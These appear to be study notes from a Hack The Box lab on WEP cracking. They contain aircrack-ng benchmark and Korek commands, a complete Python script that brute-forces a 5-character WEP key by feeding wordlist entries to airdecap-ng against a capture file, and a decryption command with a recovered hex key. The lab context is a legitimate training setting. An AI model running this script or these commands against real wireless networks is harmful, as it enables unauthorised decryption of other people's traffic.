#### Aircrack-ng Benchmark

```sh
3kjS@htb[/htb]$ aircrack-ng -S

1628.101 k/s
```
#### Korek WEP Cracking

```sh
3kjS@htb[/htb]$ aircrack-ng -K HTB.ivs
```
### Bruteforce WEP cracking

![](Additional%20WEP%20Cracking-20260921-165651.png)

```python
import sys
import binascii
import re
from subprocess import Popen, PIPE
import time

# Start timer
start_time = time.time()

# File paths
cap_file = '/opt/WEP-01.cap'
wordlist_path = '/opt/1000000-password-seclists.txt'
wordlist = []

# Read wordlist file to a list
with open(wordlist_path, 'r') as f:
    wordlist = f.readlines()

# Iterate over the wordlist
for ln, word in enumerate(wordlist, start=1):
    # Clean the line to remove non-alphanumeric characters
    key = re.sub(r'\W+', '', word)

    # Filter wordlist to only keep 5-character long words
    if len(key) != 5 :
        continue

    # Encode the WEP key to bytes and convert to hexadecimal
    hex_key = binascii.hexlify(key.encode('utf-8'))

    # Print the current attempt
    print(f"{ln}: Trying Key: {key} Hex: {hex_key}")

    # Run airdecap-ng with the current WEP key
    p = Popen(['/usr/bin/airdecap-ng', '-w', hex_key, cap_file], stdout=PIPE)
    output = p.stdout.read().decode("utf-8")

    # Check if the key was successful
    if int(output.split('\n')[5][-1]) > 0:
        print(f"Success! WEP key found: {key}")
        end_time = time.time()
        print(f"Total time: {end_time - start_time:.6f} seconds")
        sys.exit(0)

# If no key was found
print("No WEP key found")
```

```sh
3kjS@htb[/htb]$ python3 bruteforce.py
```

```sh
3kjS@htb[/htb]$ airdecap-ng -w 636865656b WEP-01.cap
```

![](Additional%20WEP%20Cracking-20260921-165949.png)